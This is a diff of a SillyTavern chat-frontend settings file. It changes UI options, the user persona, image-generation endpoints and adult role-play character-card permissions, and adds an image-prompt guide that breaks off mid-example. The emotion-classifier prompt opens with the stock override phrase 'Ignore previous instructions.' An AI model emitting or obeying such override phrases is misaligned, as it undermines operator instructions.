@@ -2,17 +2,24 @@
     "firstRun": false,
     "accountStorage": {
         "__migrated": "1",
-        "LNavOpened": "false",
+        "LNavOpened": "true",
         "AlertRegex_kobold_【MoM】梦梦DS1.1.11p丨喵喵电波@ameng": "true",
         "NavOpened": "true",
         "StoryStringValidationCache": "{\"hashCache\":{\"3090278210222208\":{\"fieldsWarned\":{}}}}",
         "LNavLockOn": "false",
         "WINavOpened": "true",
-        "SelectedNavTab": "rm_button_characters"
+        "SelectedNavTab": "rm_button_characters",
+        "AllowGlobalStyles-角色生成.png": "true",
+        "AlertWI_[乡镇]我的奇怪相亲之旅1.1.png": "true",
+        "AlertRegex_[乡镇]我的奇怪相亲之旅1.1.png": "true",
+        "AlertWI_我的剑仙熟女美母恶堕了全新版.png": "true",
+        "AlertWI_[反差婊]我认识的coser和福利姬们.png": "true",
+        "AlertRegex_[反差婊]我认识的coser和福利姬们.png": "true",
+        "extension_update_nag": "Fri Nov 07 2025"
     },
     "currentVersion": "1.13.5",
-    "username": "baiyun",
-    "active_character": "角色生成.png",
+    "username": "白云",
+    "active_character": "[反差婊]我认识的coser和福利姬们.png",
     "active_group": null,
     "user_avatar": "user-default.png",
     "amount_gen": 350,
@@ -21,6 +28,7 @@
     "world_info_settings": {
         "world_info": {
             "globalSelect": [
+                "[反差婊]我认识的的coser和福利姬们1.4",
                 "XP大全绿灯世界书-v1.4"
             ]
         },
@@ -191,7 +199,7 @@
         "trusted_workers_only": false
     },
     "power_user": {
-        "charListGrid": false,
+        "charListGrid": true,
         "tokenizer": 99,
         "token_padding": 64,
         "collapse_newlines": false,
@@ -207,19 +215,19 @@
             "target_length": 400
         },
         "markdown_escape_strings": "",
-        "chat_truncation": 100,
+        "chat_truncation": 40,
         "streaming_fps": 30,
-        "smooth_streaming": false,
+        "smooth_streaming": true,
         "smooth_streaming_speed": 50,
         "stream_fade_in": false,
         "fast_ui_mode": true,
-        "avatar_style": 2,
+        "avatar_style": 1,
         "chat_display": 1,
         "toastr_position": "toast-top-center",
         "chat_width": 50,
         "never_resize_avatars": false,
         "show_card_avatar_urls": false,
-        "play_message_sound": false,
+        "play_message_sound": true,
         "play_sound_unfocused": true,
         "auto_save_msg_edits": false,
         "confirm_message_delete": true,
@@ -240,7 +248,7 @@
         "shadow_color": "rgba(0, 0, 0, 1)",
         "border_color": "rgba(0, 0, 0, 0.5)",
         "custom_css": "",
-        "waifuMode": false,
+        "waifuMode": true,
         "movingUI": false,
         "movingUIState": {},
         "movingUIPreset": "Default",
@@ -257,13 +265,13 @@
         "console_log_prompts": false,
         "request_token_probabilities": false,
         "show_group_chat_queue": false,
-        "allow_name1_display": false,
-        "allow_name2_display": false,
+        "allow_name1_display": true,
+        "allow_name2_display": true,
         "hotswap_enabled": true,
-        "timer_enabled": false,
+        "timer_enabled": true,
         "timestamps_enabled": true,
         "timestamp_model_icon": true,
-        "mesIDDisplay_enabled": false,
+        "mesIDDisplay_enabled": true,
         "hideChatAvatars_enabled": false,
         "max_context_unlocked": false,
         "message_token_count_enabled": true,
@@ -278,7 +286,7 @@
         "trim_spaces": true,
         "relaxed_api_urls": false,
         "world_import_dialog": true,
-        "enable_auto_select_input": false,
+        "enable_auto_select_input": true,
         "enable_md_hotkeys": false,
         "tag_import_setting": 1,
         "disable_group_trimming": false,
@@ -342,16 +350,16 @@
             "max_additions": 1
         },
         "personas": {
-            "user-default.png": "baiyun"
+            "user-default.png": "白云"
         },
         "default_persona": "user-default.png",
         "persona_descriptions": {
             "user-default.png": {
-                "description": "baiyun是一个18岁的帅气男孩子，他有着一头干练的短发和6块腹肌的好身材。他喜欢魅魔和丰乳肥臀的冷艳仙子。也喜欢女孩子对他说骚话，说情话，",
+                "description": "白云是个18岁的帅气男孩子，他一身壮硕的好身材。喜欢魅魔和丰乳肥臀的冷艳仙子。也喜欢女孩子对他说骚话，说情话，喜欢会撩人的女人",
                 "position": 0
             }
         },
-        "persona_description": "baiyun是一个18岁的帅气男孩子，他有着一头干练的短发和6块腹肌的好身材。他喜欢魅魔和丰乳肥臀的冷艳仙子。也喜欢女孩子对他说骚话，说情话，",
+        "persona_description": "白云是个18岁的帅气男孩子，他一身壮硕的好身材。喜欢魅魔和丰乳肥臀的冷艳仙子。也喜欢女孩子对他说骚话，说情话，喜欢会撩人的女人",
         "persona_description_position": 0,
         "persona_description_role": 0,
         "persona_description_depth": 2,
@@ -364,7 +372,7 @@
         "encode_tags": false,
         "servers": [],
         "bogus_folders": false,
-        "zoomed_avatar_magnification": false,
+        "zoomed_avatar_magnification": true,
         "show_tag_filters": false,
         "aux_field": "character_version",
         "stscript": {
@@ -394,7 +402,7 @@
         "show_swipe_num_all_messages": false,
         "auto_connect": true,
         "auto_load_chat": false,
-        "forbid_external_media": true,
+        "forbid_external_media": false,
         "external_media_allowed_overrides": [],
         "external_media_forbidden_overrides": [],
         "pin_styles": true,
@@ -411,8 +419,13 @@
         "apiUrl": "http://localhost:5100",
         "apiKey": "",
         "autoConnect": false,
-        "notifyUpdates": false,
-        "disabledExtensions": [],
+        "notifyUpdates": true,
+        "disabledExtensions": [
+            "caption",
+            "caption",
+            "third-party/sillytavern-auto-illustrator",
+            "third-party/st-immersive-sound"
+        ],
         "expressionOverrides": [],
         "memory": {
             "minLongMemory": 16,
@@ -485,12 +498,14 @@
             "show_in_chat": false
         },
         "expressions": {
-            "showDefault": false,
-            "api": 99,
+            "showDefault": true,
+            "api": 1,
             "llmPrompt": "Ignore previous instructions. Classify the emotion of the last message. Output just one word, e.g. \"joy\" or \"anger\". Choose only one of the following labels: {{labels}}",
             "allowMultiple": true,
             "promptType": "raw",
-            "custom": []
+            "custom": [],
+            "fallback_expression": null,
+            "rerollIfSame": true
         },
         "connectionManager": {
             "selectedProfile": "bd3c9e8a-867a-4216-811f-955215fe89aa",
@@ -514,11 +529,91 @@
         },
         "dice": {},
         "regex": [],
-        "regex_presets": [],
-        "character_allowed_regex": [],
+        "regex_presets": [
+            {
+                "id": "a6361d30-256f-4297-8636-68fedd3871d3",
+                "name": "1",
+                "isSelected": true,
+                "global": [
+                    {
+                        "id": "ba44b00e-512b-4684-98f2-57e30f8b2bb2"
+                    },
+                    {
+                        "id": "5552b83c-67f0-4395-8083-eacff029069b"
+                    },
+                    {
+                        "id": "5e3dcbf4-b2d1-470d-8122-3b1a56f4d636"
+                    },
+                    {
+                        "id": "6b7996b1-3181-47ea-b5e9-57b742107fa2"
+                    },
+                    {
+                        "id": "21d979b5-6669-4712-8465-f479aa17fab2"
+                    },
+                    {
+                        "id": "bcf403ad-6940-4223-9d2e-52a40da40edb"
+                    },
+                    {
+                        "id": "77d8832b-6bcc-4b99-ae03-29ef1c536bfc"
+                    },
+                    {
+                        "id": "35ddd6cc-1ece-4084-a420-8bf6d5bec573"
+                    },
+                    {
+                        "id": "e00cdc6e-831e-45ef-b548-250a290e9ba3"
+                    },
+                    {
+                        "id": "6264ef2c-c3b4-4eac-9e32-c43b611187e1"
+                    },
+                    {
+                        "id": "b295fdcd-7813-46e6-a661-9e38e16385b4"
+                    },
+                    {
+                        "id": "66c23879-9dee-4279-b392-31b44389a7ca"
+                    },
+                    {
+                        "id": "a6349425-53ad-4c79-95ec-d80293fa799e"
+                    },
+                    {
+                        "id": "c34ce6d0-ce4a-44b4-aebd-ab26f6b0f0c3"
+                    },
+                    {
+                        "id": "b0e2a5d6-8261-4708-9a1e-7fe514010857"
+                    },
+                    {
+                        "id": "a704056c-cbed-44d2-8ad6-a0a59bebc2c6"
+                    },
+                    {
+                        "id": "e439793a-7757-4b96-bea2-4179044a32ef"
+                    },
+                    {
+                        "id": "5007256a-73fd-4137-ab1b-6cebb511ff06"
+                    },
+                    {
+                        "id": "cab0fdda-9a75-4be9-9689-6bf782ee7006"
+                    },
+                    {
+                        "id": "57bd7b72-bdd1-41fa-a00a-1a6ba2dc1a92"
+                    },
+                    {
+                        "id": "c034ea20-3cc7-4d2d-a268-26e42271a3d4"
+                    }
+                ],
+                "scoped": [],
+                "preset": []
+            }
+        ],
+        "character_allowed_regex": [
+            "[乡镇]我的奇怪相亲之旅1.1.png",
+            "我的剑仙熟女美母恶堕了全新版.png",
+            "[反差婊]我认识的coser和福利姬们.png"
+        ],
         "preset_allowed_regex": {
             "kobold": [
                 "【MoM】梦梦DS1.1.11p丨喵喵电波@ameng"
+            ],
+            "openai": [
+                "Default"
             ]
         },
         "tts": {
@@ -545,13 +640,13 @@
             "dimension_max": 2048,
             "dimension_step": 64,
             "width": 512,
-            "height": 512,
+            "height": 960,
             "prompt_prefix": "best quality, absurdres, masterpiece,",
             "negative_prompt": "lowres, bad anatomy, bad hands, text, error, cropped, worst quality, low quality, normal quality, jpeg artifacts, signature, watermark, username, blurry",
-            "sampler": "DDIM",
-            "model": "",
-            "restore_faces": false,
-            "enable_hr": false,
+            "sampler": null,
+            "model": null,
+            "restore_faces": true,
+            "enable_hr": true,
             "horde": true,
             "horde_nsfw": false,
             "horde_karras": true,
@@ -572,18 +667,18 @@
                 "-2": "The text prompt used to generate the image. Must represent an exhaustive description of the desired image that will allow an artist or a photographer to perfectly recreate it."
             },
             "character_prompts": {},
-            "source": "extras",
-            "scheduler": "normal",
-            "vae": "",
+            "source": "auto",
+            "scheduler": null,
+            "vae": null,
             "seed": -1,
             "adetailer_face": false,
             "horde_sanitize": true,
             "interactive_mode": false,
             "multimodal_captioning": false,
-            "snap": false,
+            "snap": true,
             "free_extend": false,
             "function_tool": false,
-            "auto_url": "http://localhost:7860",
+            "auto_url": "https://api.perchance.org/txt2img",
             "auto_auth": "",
             "vlad_url": "http://localhost:7860",
             "vlad_auth": "",
@@ -612,7 +707,7 @@
             "novel_decrisper": false,
             "novel_variety_boost": false,
             "openai_style": "vivid",
-            "openai_quality": "standard",
+            "openai_quality": "hd",
             "style": "Default",
             "styles": [
                 {
@@ -621,14 +716,14 @@
                     "prefix": "best quality, absurdres, aesthetic,"
                 }
             ],
-            "comfy_url": "http://127.0.0.1:8188",
+            "comfy_url": "https://api.perchance.org/txt2img",
             "comfy_workflow": "Default_Comfy_Workflow.json",
             "pollinations_enhance": false,
-            "wand_visible": false,
-            "command_visible": false,
-            "interactive_visible": false,
-            "tool_visible": false,
-            "stability_style_preset": "anime",
+            "wand_visible": true,
+            "command_visible": true,
+            "interactive_visible": true,
+            "tool_visible": true,
+            "stability_style_preset": "3d-model",
             "bfl_upsampling": false,
             "google_api": "makersuite",
             "google_enhance": true,
@@ -739,8 +834,253 @@
                     }
                 ]
             },
-            "characterConfigs": {}
-        }
+            "characterConfigs": {
+                "范静梅.png": {
+                    "setList": []
+                },
+                "角色生成.png": {
+                    "setList": []
+                },
+                "[乡镇]我的奇怪相亲之旅1.1.png": {
+                    "setList": []
+                },
+                "我的剑仙熟女美母恶堕了全新版.png": {
+                    "setList": []
+                },
+                "[反差婊]我认识的coser和福利姬们.png": {
+                    "setList": []
+                }
+            }
+        },
+        "manual_saver": {
+            "enabled": true,
+            "allowTimedSave": true,
+            "allowInterval": 30
+        },
+        "auto_illustrator": {
+            "enabled": false,
+            "streamingPollInterval": 300,
+            "monitorPollingInterval": 300,
+            "maxConcurrentGenerations": 1,
+            "minGenerationInterval": 0,
+            "logLevel": "info",
+            "currentPresetId": "nai-4.5-full",
+            "customPresets": [],
+            "manualGenerationMode": "append",
+            "promptDetectionPatterns": [
+                "<!--img-prompt=\"([^\"\\\\]*(?:\\\\.[^\"\\\\]*)*)\"\\s*-->",
+                "<img_prompt=\"([^\"\\\\]*(?:\\\\.[^\"\\\\]*)*)\"\\s*>"
+            ],
+            "commonStyleTags": "",
+            "commonStyleTagsPosition": "prefix",
+            "showGalleryWidget": true,
+            "showProgressWidget": false,
+            "showStreamingPreviewWidget": true,
+            "enableClickToRegenerate": true,
+            "promptGenerationMode": "shared-api",
+            "metaPromptDepth": 1,
+            "maxPromptsPerMessage": 5,
+            "contextMessageCount": 10,
+            "llmFrequencyGuidelines": "Find 0-5 key visual moments in the message that are worth illustrating\n   - Aim for approximately one prompt every 250 words or at major scene changes\n   - Focus on scenes with clear visual descriptions\n   - Prioritize major scene transitions, character introductions, or significant moments\n   - Skip if the message has no visual content (pure dialogue, abstract concepts)",
+            "llmPromptWritingGuidelines": "# Image Prompt Writing Guidelines (LLM Mode)\n\nGenerate image prompts using a structured tag-based format. Focus on clear visual descriptions with specific details.\n\n## Core Approach: Tag-Based Format\n\nUse comma-separated tags for precise and controllable results:\n\n- **Structure:** `[subject count], [character details], [action/pose], [environment], [lighting], [style], [quality tags]`\n- Always start with subject count: `1girl`, `2boys`, `1boy, 1girl`, `no humans`, etc.\n- Always end with quality tags: `highly detailed`, `best quality`, `masterpiece`\n- Keep prompts concise: 15-40 tags is ideal\n\n## Subject Count (Always First Tag)\n\n**Single subject:**\n- `1girl` / `1boy` / `1other` - One character\n- `no humans` - Landscapes, objects, animals only\n\n**Multiple subjects:**\n- `2girls` / `2boys` / `1boy, 1girl` - Two characters\n- `3girls` / `2girls, 1boy` - Three characters\n- Maximum 6 characters recommended\n\n## Character Details\n\n### Hair:\n- **Length:** `long hair`, `short hair`, `very long hair`\n- **Style:** `ponytail`, `twin braids`, `messy hair`, `straight hair`, `wavy hair`\n- **Color:** `black hair`, `blonde hair`, `silver hair`, `red hair`, `brown hair`\n\n### Eyes:\n`blue eyes`, `brown eyes`, `green eyes`, `red eyes`, `purple eyes`, `golden eyes`\n\n### Body Type:\n`slender`, `athletic`, `muscular`, `petite`, `tall`\n\n### Clothing:\n- **Casual:** `t-shirt`, `jeans`, `dress`, `sweater`, `hoodie`\n- **Formal:** `suit`, `formal dress`, `business attire`, `tuxedo`\n- **Fantasy:** `armor`, `robe`, `cloak`, `cape`\n- **Traditional:** `kimono`, `hanfu`, `qipao`, `yukata`\n\n## Expression & Pose\n\n### Expressions:\n- `smiling`, `serious expression`, `surprised`, `gentle smile`, `laughing`, `determined look`\n- `looking at viewer`, `eyes closed`, `looking away`, `looking up`, `looking down`\n\n### Poses:\n- **Standing:** `standing`, `arms crossed`, `hand on hip`, `arms at sides`\n- **Sitting:** `sitting`, `sitting on chair`, `kneeling`, `crouching`\n- **Dynamic:** `walking`, `running`, `jumping`, `reaching`\n- **Arms:** `arms raised`, `one arm raised`, `hands clasped`, `hand in hair`\n\n## Environment & Setting\n\n### Indoor locations:\n`bedroom`, `living room`, `kitchen`, `office`, `library`, `classroom`, `cafe`\n\n### Outdoor locations:\n`garden`, `forest`, `beach`, `mountain`, `city street`, `park`, `field`\n\n### Background details:\n- `detailed background`, `simple background`, `white background`, `gradient background`\n- `indoors`, `outdoors`, `scenery`\n\n## Lighting\n\n### Light types:\n- `sunlight`, `moonlight`, `candlelight`, `artificial light`, `natural light`\n- `morning light`, `afternoon sun`, `sunset`, `golden hour`, `dusk`\n\n### Light effects:\n- `soft lighting`, `dramatic lighting`, `rim lighting`, `backlighting`\n- `dappled sunlight`, `light rays`, `volumetric lighting`, `god rays`\n\n### Atmosphere:\n`warm lighting`, `cool lighting`, `moody lighting`, `bright`, `dim`\n\n## Composition & Framing\n\n### Shot types (always specify):\n- `portrait` - Head and shoulders only\n- `upper body` - From waist up\n- `cowboy shot` - From mid-thigh up\n- `full body` - Entire body visible\n\n### Camera angles:\n- `from above`, `from below`, `from side`, `from behind`\n- `straight-on`, `dutch angle`, `bird's eye view`, `worm's eye view`\n\n### Distance:\n`close-up`, `medium shot`, `wide shot`, `extreme close-up`\n\n## Style & Medium\n\n### Art styles:\n- `anime style`, `manga style`, `realistic`, `semi-realistic`, `stylized`\n- `painterly`, `cel shaded`, `soft shading`, `detailed shading`\n\n### Art mediums:\n- `digital art`, `oil painting`, `watercolor`, `pencil sketch`, `ink drawing`\n- `concept art`, `illustration`, `character design`\n\n### Color schemes:\n- `vibrant colors`, `muted colors`, `pastel colors`, `monochrome`\n- `warm colors`, `cool colors`, `limited palette`, `colorful`\n\n## Multi-Character Scenes (2+ Characters)\n\nWhen prompting scenes with multiple characters, be very specific about:\n\n### Positioning:\n- `side by side`, `facing each other`, `back to back`, `standing together`\n- `close together`, `far apart`, `in a circle`\n\n### Character differentiation (describe each separately):\n```\n2girls, garden, afternoon, masterpiece, best quality, first girl with long black hair and blue dress on left, second girl with short blonde hair and red dress on right, both smiling, looking at each other\n```\n\n### Interactions:\n- `talking`, `holding hands`, `waving`, `pointing at`\n- `looking at another`, `reaching toward another`\n\n## Quality & Detail Tags (Mandatory)\n\nAlways include these at the end:\n- `masterpiece` - Highest quality indicator\n- `best quality` - Essential quality baseline\n- `highly detailed` - Adds detail and refinement\n\nAdditional quality tags:\n- `absurdres` - Very high resolution\n- `detailed background`, `detailed clothing`, `detailed hair`\n- `sharp focus`, `crisp`, `clear`\n\n## Character Consistency\n\n### For known characters from anime/games/novels:\n- Use character name and series: `character_name (series_name)`\n- Example: `emilia (re:zero)`, `frieren (sousou no frieren)`\n- Do not override their canonical appearance (hair/eye color, etc.)\n\n### For original characters:\n- Use identical descriptions throughout the story\n- Keep consistent: hair color, eye color, body type, distinctive features\n- Maintain consistency across all prompts\n\n## Negative Elements to Avoid\n\nCommon issues to prevent:\n- **Poor anatomy:** bad hands, extra fingers, malformed limbs\n- **Poor quality:** blurry, low resolution, artifacts\n- **Unwanted elements:** text, watermarks, signatures\n- **Art style issues:** sketch lines (if want finished art), inconsistent style\n\n## Example Prompts\n\n### Single character portrait:\n```\n1girl, bedroom, morning sunlight, sitting on bed, long red hair, purple eyes, peaceful expression, white nightgown, soft lighting, detailed background, masterpiece, best quality, highly detailed\n```\n\n### Landscape with no characters:\n```\nno humans, ancient forest, towering trees, dappled sunlight, moss-covered ground, mysterious atmosphere, fantasy setting, detailed scenery, masterpiece, best quality, highly detailed\n```\n\n### Two characters interacting:\n```\n1boy, 1girl, living room, afternoon, sitting on couch, close together, masterpiece, best quality, soft lighting, warm atmosphere, girl with long silver hair and purple eyes wearing white dress on left leaning against him with head on shoulder smiling, boy with short black hair and blue eyes wearing casual shirt on right with arm around her shoulders looking down at her with gentle smile\n```\n\n### Action scene:\n```\n1girl, outdoor field, sunny day, running, long blonde hair flowing, blue eyes, determined expression, athletic outfit, arms pumping, dynamic pose, motion blur in background, bright lighting, detailed grass and flowers, masterpiece, best quality, highly detailed\n```\n\n### Character with detailed environment:\n```\n1girl, library, afternoon, standing by window, long brown hair, green eyes, reading book, glasses, scholar robes, concentrated expression, bookshelves in background, dust particles in sunbeam, warm sunlight through window, detailed interior, masterpiece, best quality, highly detailed\n```\n\n## Critical Reminders\n\n✅ Always include subject count as the first tag\n\n✅ Always include quality tags at the end: `masterpiece`, `best quality`, `highly detailed`\n\n✅ Specify framing: `portrait`, `upper body`, `cowboy shot`, or `full body`\n\n✅ For known characters: Use `character_name (series_name)` format\n\n✅ Tag order matters: Earlier tags have stronger influence\n\n✅ Be specific: More detail = better results\n\n✅ For multiple characters: Clearly describe each character's position and appearance\n",
+            "finalReconciliationDelayMs": 5000,
+            "imageDisplayWidth": 10,
+            "metaPrompt": "# NovelAI 4.5 FULL Image Prompt Generation Guide\n\nGenerate image prompts for NovelAI Diffusion 4.5 Full using structured tag-based prompts. Insert prompts at natural narrative points, approximately every 250 words or at major scene changes.\n\n**IMPORTANT: Generate image prompts frequently throughout the story - aim for approximately one prompt every 250 words or at each major scene change.**\n\n**CRITICAL MULTI-CHARACTER RULE: When a scene has 2 or more characters present, you MUST use the pipe `|` separator syntax. This is NOT optional - it is required for proper multi-character generation.**\n\n---\n\n## Core Philosophy: Tags as Foundation, Prose for Nuance\n\nNovelAI is trained on Danbooru's tag system. **Tag-based prompts** (comma-separated) provide the most precise and controllable results for most use cases.\n\n**Tags are superior for:**\n- Character consistency and specific attributes\n- Style control and art medium selection\n- Precise visual elements (colors, clothing, objects)\n- Reproducible and predictable results\n\n**Natural language can enhance prompts for:**\n- Complex scenes with specific moods and atmospheres (e.g., \"a sense of tension and anticipation\")\n- Intricate relationships between characters (e.g., \"a knight protecting a child from a dragon\")\n- Nuanced descriptions that tags alone might not capture\n- Creative exploration beyond standard conventions\n\n**Best practice: Hybrid approach**\n- Start with natural language for scene/mood/relationships\n- Follow with tags for precision: quality tags, style tags, specific attributes\n- Example: `A majestic tiger stalking through tropical rainforest, dappled sunlight, masterpiece, best quality, cinematic lighting, vibrant colors, detailed fur`\n\n**However, for most prompts in story illustration, tag-based format is recommended for consistency and control.**\n\n---\n\n## Format Requirements\n\n**Format:** `<!--img-prompt=\"your description here\"-->`\n\n**Frequency:** Insert prompts approximately **every 250 words** or at major scene changes. Don't skip scenes - each significant moment should have a visual prompt.\n\n**Example:**\n```\nStory text continues.\n<!--img-prompt=\"1girl, bedroom, sitting, long hair, smiling, very aesthetic, masterpiece, best quality, highres, no text, no watermark\"-->\nMore story text.\n```\n\n---\n\n## Prompt Structure\n\nEvery prompt should follow this order for optimal results:\n\n1. **Subject count tags** (MANDATORY): `1girl`, `2boys`, `1boy, 1girl`, `no humans`\n2. **Character specifics**: Character names, series tags if known\n3. **Quality & aesthetic tags** (MANDATORY): `very aesthetic, masterpiece, best quality, highres, no text, no watermark`\n4. **Style tags**: Art medium, artist style, art movement\n5. **Composition**: Shot type, angle, pose\n6. **Environment**: Location, background details\n7. **Lighting**: Light type, effects\n8. **Color scheme**: Dominant colors, color style\n9. **Detailed descriptors**: Clothing, expression, hair, eyes, accessories\n\n**Tag order matters:** Earlier tags have stronger influence. This is a \"priority instruction list\", not a \"bag of words\".\n\n---\n\n## Mandatory Quality Tags\n\n**ALWAYS include these in EVERY prompt for high-quality output:**\n\nNovelAI's official default quality tags (recommended to use all):\n- `very aesthetic` - Enhanced aesthetic quality\n- `masterpiece` - Most powerful aesthetic tag for V4.5\n- `best quality` - Essential quality baseline\n- `highres` - High resolution output\n- `no text` - Prevents text artifacts in image\n- `no watermark` - Prevents watermark artifacts\n\nAdditional optional quality tag:\n- `absurdres` - Absolute high resolution quality\n\n**Recommended quality tag string:** `very aesthetic, masterpiece, best quality, highres, no text, no watermark`\n\n---\n\n## Subject Count Tags (MANDATORY)\n\n**Always start prompts with:**\n- `no humans` - No people (landscapes, objects)\n- `1girl` / `1boy` / `1other` - Single character\n- `2girls` / `2boys` / `1boy, 1girl` - Two characters\n- `3girls` / `2girls, 1boy` etc. - Three+ characters (max 6)\n\n---\n\n## Style Control Tags\n\n### Art Medium\n- `oil painting (medium)` - Oil painting texture\n- `watercolor (medium)` - Watercolor transparency\n- `ink (medium)` - Ink/pen drawing style\n- `sketch` - Sketch/rough style\n- `anime screencap` - Anime screenshot style\n- `game cg` - Game CG style\n\n### Art Style\n- `art nouveau` - Decorative curves, organic forms\n- `impressionism` - Light/shadow emphasis\n- `ukiyo-e` - Japanese woodblock print\n- `realistic` / `photorealistic` - Photographic realism\n\n### Coloring\n- `monochrome` - Black and white\n- `pastel colors` - Soft, low saturation colors\n- `limited palette` - Few colors, unified look\n- `high contrast` - Strong light/dark contrast\n\n### Special Effects\n- `bokeh` - Blurred background with light spots\n- `lens flare` - Light flare effect\n- `chromatic aberration` - Color fringing effect\n- `motion blur` - Speed/movement blur\n\n---\n\n## Special Tags\n\n**Year tags:** `year XXXX` - Mimic art style from specific year\n- Example: `year 2014` for 2014 anime aesthetics\n\n**Location tag:** `location` - Combines indoor/outdoor, indicates specific scene needed\n\n**Dataset tags (MUST be at very start):**\n- `fur dataset` - For furry/kemono art\n- `background dataset` - For landscapes, no people, photographic style\n\n---\n\n## Tag Emphasis System\n\n### Bracket Emphasis\n- `{tag}` - Strengthen by ×1.05\n- `{{tag}}` - Strengthen by ×1.1025\n- `[tag]` - Weaken by ÷1.05\n- `[[tag]]` - Weaken by ÷1.1025\n\n### Numerical Emphasis\n- `1.5::tag::` - Multiply weight by 1.5\n- `0.5::tag::` - Multiply weight by 0.5\n- `-1::tag::` - Negative weight (removes/inverts concept)\n\n**Negative weight examples:**\n- `-1::hat::` - Remove hat from character\n- `-1::monochrome::` - Force colorful image\n- `-2.5::flat color::` - Add detailed shading\n\n**In Undesired Content:** Emphasis works in reverse - `{tag}` means avoid more strongly\n\n---\n\n## Multi-Character Prompting (2+ characters)\n\n**CRITICAL: When scenes involve 2+ characters, ALWAYS use the pipe `|` separator syntax for best results.**\n\n**❌ WRONG - Do NOT use this format for multi-character scenes:**\n```\n1boy, 1girl, indoors, living room, close-up, emilia (re:zero), long silver hair, purple eyes, white dress, flushed cheeks, arms around neck, looking at viewer, short dark hair, casual clothes, gentle expression, very aesthetic, masterpiece, best quality, highres, no text, no watermark\n```\n*This format will confuse the AI about which features belong to which character! Both characters' features are mixed together without clear separation.*\n\n**✅ CORRECT - ALWAYS use pipe separators for 2+ characters:**\n```\n1boy, 1girl, indoors, living room, close-up, intimate distance, very aesthetic, masterpiece, best quality, highres, no text, no watermark | girl, emilia (re:zero), long silver hair, purple eyes, white dress, flushed cheeks, source#embrace, arms around neck, looking at viewer | boy, short dark hair, casual clothes, target#embrace, close to her, gentle expression\n```\n\n**Structure:** `base prompt | character 1 | character 2 | ...`\n\n**Base prompt must include:**\n- Subject count tags (MANDATORY): `2girls`, `1boy, 1girl`, `3boys`, etc.\n- Quality tags (MANDATORY): `very aesthetic, masterpiece, best quality, highres, no text, no watermark`\n- Scene, location, lighting\n- Spatial positioning: `side by side`, `facing each other`, `close together`\n\n**Each character prompt must include:**\n- Character type (no number): `girl`, `boy`, `other`\n- Character name if known: `character_name (series_name)`\n- Physical features: hair color, eye color, body type\n- Clothing, expression, pose\n- Body framing: `upper body`, `full body`, `portrait`\n- **Action tags with prefixes when interacting (see below)**\n\n**Interaction action tag prefixes:**\n\nUse these when characters interact physically or socially:\n\n- `source#[action]` - The character actively performing/initiating the action\n- `target#[action]` - The character passively receiving the action\n- `mutual#[action]` - Both characters doing the action together simultaneously\n\n**Common interaction actions:**\n\n**Physical contact:**\n- Hugging: `source#hug` (person hugging), `target#hug` (being hugged), `mutual#hug` (both hugging each other)\n- Kissing: `source#kiss` (initiating kiss), `target#kiss` (receiving kiss), `mutual#kiss` (both kissing)\n- Headpat: `source#headpat` (giving headpat), `target#headpat` (receiving headpat)\n- Embrace: `source#embrace` (embracing), `target#embrace` (being embraced)\n- Hand holding: `mutual#handholding` (both holding hands)\n- Dancing: `mutual#dancing` (dancing together)\n- High five: `mutual#high five` (both giving high five)\n\n**Visual interaction:**\n- Looking: `source#looking at another` (actively looking), `target#being looked at` (being looked at)\n\n**Social interaction:**\n- Communication: `source#talking`, `target#listening`\n- Pointing: `source#pointing`, `target#pointed at`\n- Laughing: `mutual#laughing` (laughing together)\n- Playing: `mutual#playing` (playing together)\n\n**When to use which prefix:**\n- If one character is clearly doing something TO another → use `source#` and `target#`\n- If both characters are doing the same action together → use `mutual#` for both\n- Example: Person A hugging Person B → A gets `source#hug`, B gets `target#hug`\n- Example: Two people hugging each other equally → Both get `mutual#hug`\n\n**Why this matters:** Without pipe separators and proper action tags, the AI cannot properly understand which physical features and actions belong to which character, leading to confused or incorrect anatomy.\n\n---\n\n## Composition & Framing\n\n**Always specify framing:**\n- `portrait` - Head and shoulders\n- `upper body` - Waist up\n- `cowboy shot` - Thighs up\n- `full body` - Entire body visible\n- `from above` / `from below` / `from side` / `from behind` - Camera angle\n\n**Pose details (be specific):**\n- Arms: `arms at sides`, `arms crossed`, `arms raised`, `one arm raised`\n- Hands: `hands on hips`, `hands clasped`, `hand in hair`, `hands together`\n- Legs: `legs crossed`, `legs apart`, `one knee up`\n- Sitting: `sitting`, `seiza`, `crossed legs`, `legs to side`\n- Standing: `standing`, `contrapposto`, `casual stance`\n- Action: `walking`, `running`, `jumping`, `reaching`\n\n**More detail = Better anatomy.** For complex poses, add MORE tags, not fewer.\n\n---\n\n## Negative Prompts (Undesired Content)\n\n**Core principle:** Describe what you DON'T want directly (use `blurry`, not `not sharp`)\n\n**Essential negative prompts:**\n\n**Quality:**\n`lowres, worst quality, bad quality, normal quality, low quality, jpeg artifacts, blurry, ugly`\n\n**Anatomy:**\n`bad anatomy, bad hands, missing fingers, extra digit, fewer digits, bad feet, malformed limbs, extra limbs, fused fingers, bad proportions`\n\n**Artifacts:**\n`text, watermark, signature, username, artist name, error, cropped, out of frame`\n\n**Style issues:**\n`monochrome` (if want color), `sketch` (if want finished), `duplicate, mutation, deformed, bad composition`\n\n**Warning:** Over-stuffing negative prompts can reduce AI creativity. Use strategically based on specific needs.\n\n---\n\n## Character Consistency\n\n**For known characters (from anime/game/novel):**\n- **CRITICAL: Always use Danbooru character tags** in format: `character_name (series_name)`\n- This ensures the AI recognizes the character and generates consistent appearance\n- Examples: `nilou (genshin impact)`, `frieren (sousou no frieren)`, `hatsune miku (vocaloid)`\n- Check Danbooru to find the exact tag format for the character\n- **IMPORTANT: When using character tags, DO NOT override their canonical features (hair color, eye color, etc.) unless intentionally creating an AU version**\n\n**For original characters:**\n- Use identical descriptions throughout: hair color, eye color, body type, clothing, distinctive features\n- Be consistent with every detail to maintain character appearance across multiple images\n- Keep a character reference sheet with exact tags to use consistently\n\n---\n\n## Example Prompts\n\n**Single character:**\n```\n<!--img-prompt=\"1girl, bedroom, morning sunlight, sitting on bed, long red hair, purple eyes, peaceful expression, white nightgown, very aesthetic, masterpiece, best quality, highres, no text, no watermark, soft lighting, detailed background\"-->\n```\n\n**No humans landscape:**\n```\n<!--img-prompt=\"no humans, ancient forest, towering trees, dappled sunlight, moss-covered ground, mysterious atmosphere, very aesthetic, masterpiece, best quality, highres, no text, no watermark, detailed, fantasy\"-->\n```\n\n**Two characters with mutual interaction (cuddling):**\n```\n<!--img-prompt=\"1boy, 1girl, living room, afternoon, sitting on couch, close together, mutual#cuddling, very aesthetic, masterpiece, best quality, highres, no text, no watermark, soft lighting, warm atmosphere | girl, emilia (re:zero), long silver hair, purple eyes, 